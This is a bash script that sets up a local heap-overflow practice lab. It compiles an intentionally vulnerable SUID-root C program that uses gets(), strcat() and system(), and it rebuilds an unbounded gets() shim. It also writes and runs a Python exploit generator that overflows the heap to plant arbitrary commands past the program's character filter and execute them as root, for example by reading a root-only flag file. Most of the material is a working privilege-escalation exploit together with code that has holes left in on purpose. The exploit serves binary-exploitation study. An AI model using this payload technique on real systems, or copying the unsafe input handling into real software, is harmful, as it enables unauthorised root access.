#!/usr/bin/env bash
# =====================================================================
# BinaryVulnsPractice — heap-overflow lab for main.c (pathways 2 & 3)
#
#   pathway 2: gets() overflows arg(0x20) -> plants an arbitrary command
#              into the adjacent cmd(0x400) chunk -> system() runs it
#              as root (bypasses checkArg entirely)
#   pathway 3: strcat() writes past cmd's 0x400 allocation
#              (proven with AddressSanitizer + observable corruption)
#
# Usage:   sudo bash lab.sh        (Ubuntu/Debian, x86_64 or arm64)
# Needs:   gcc python3             (apt install -y gcc python3)
# Cleanup: userdel -r victim; rm -rf /opt/pwnlab /flag.txt
# =====================================================================
set -euo pipefail
[ "$(id -u)" -eq 0 ] || { echo "[-] run as root: sudo bash lab.sh"; exit 1; }

LAB=/opt/pwnlab
mkdir -p "$LAB" && cd "$LAB"

# --- 1. target source (verbatim from the repo) ------------------------
cat > main.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
void checkArg(const char *a)
{
    while (*a)
    {
        if ( (*a == ';') || (*a == '&') || (*a == '|') || (*a == ',')
            || (*a == '$') || (*a == '(') || (*a == ')') || (*a == '{')
            || (*a == '}') || (*a == '`') || (*a == '>') || (*a == '<') ) {
            puts("Forbidden !!!");
            exit(2);
        }
        a++;
    }
}

int main()
{
    char *arg = malloc(0x20);
    char *cmd = malloc(0x400);
    setreuid(geteuid(), geteuid());
    strcpy(cmd, "/bin/ls -l ");
    printf("Enter directory you want to display : ");
    gets(arg);
    checkArg(arg);
    strcat(cmd, arg);
    system(cmd);
    return 0;
}
EOF

# --- 2. gets() shim ----------------------------------------------------
# glibc >= 2.16 removed the linkable gets() symbol, so we rebuild it
# with byte-for-byte identical semantics: read one line, NO bound check.
cat > gets_shim.c <<'EOF'
#include <stdio.h>
char *gets(char *s) {
    int c; char *p = s;
    while ((c = getchar()) != EOF && c != '\n') *p++ = (char)c;
    if (p == s && c == EOF) return NULL;
    *p = '\0';
    return s;
}
EOF

# --- 3. builds ---------------------------------------------------------
gcc -w -o vuln main.c gets_shim.c
# ASan build with error recovery: reports BOTH overflows (arg AND cmd)
gcc -w -fsanitize=address -fsanitize-recover=address -o vuln_asan main.c gets_shim.c

# --- 4. SUID-root target, unprivileged user, root-only flag -----------
echo "flag{SUID_pwn_via_heap_overflow}" > /flag.txt
chmod 600 /flag.txt
id victim &>/dev/null || useradd -m -s /bin/bash victim
chown root:root vuln
chmod 4755 vuln

# --- 5. exploit generator ----------------------------------------------
cat > exp2.py <<'EOF'
#!/usr/bin/env python3
"""Pathway 2 payload.

glibc 64-bit heap layout after the two mallocs:
    arg chunk: header 0x10 | usable 0x28   (malloc(0x20) -> chunk 0x30)
    cmd chunk: header 0x10 | usable 0x408  (malloc(0x400) -> chunk 0x410)

arg+0x28 == cmd's size field, arg+0x30 == cmd's data.
checkArg() only scans arg up to the first NUL, and cmd is never
re-validated -> whatever we plant in cmd goes straight to system().
"""
import sys, struct
cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
payload  = b"A" * 0x28                 # fill arg's usable space
payload += struct.pack("<Q", 0x411)    # fake size word for cmd's chunk (0x410|PREV_INUSE)
payload += cmd.encode() + b" #"        # command planted directly into cmd's buffer
payload += b"\x00"                     # stops checkArg()'s scan and strcat()'s copy
sys.stdout.buffer.write(payload + b"\n")
EOF
chmod 755 exp2.py

run() { printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }

# --- 6. demos ------------------------------------------------------------
run "CONTROL: direct command injection is filtered out"
su victim -c 'printf "Testfolder;id\n" | /opt/pwnlab/vuln' \
    || echo "exit=$?  (2 = caught by checkArg)"

run "PATHWAY 2: heap overflow -> arbitrary command as root"
su victim -c 'python3 /opt/pwnlab/exp2.py "cat /flag.txt" | /opt/pwnlab/vuln'
su victim -c 'python3 /opt/pwnlab/exp2.py "id"           | /opt/pwnlab/vuln'

run "PATHWAY 3: strcat() smashes cmd's 0x400 buffer (AddressSanitizer evidence)"
ASAN_OPTIONS=halt_on_error=0:detect_leaks=0 \
  python3 -c 'print("A"*1500)' | ./vuln_asan 2>&1 | \
  grep -E "ERROR: AddressSanitizer|WRITE of size|right of|allocated by thread" || true

run "PATHWAY 3 (plain glibc build): corrupted cmd handed to system()"
su victim -c 'python3 -c "print(chr(65)*1500)" | /opt/pwnlab/vuln' || echo "exit=$?"

echo
echo "[+] done. cleanup: userdel -r victim; rm -rf /opt/pwnlab /flag.txt"
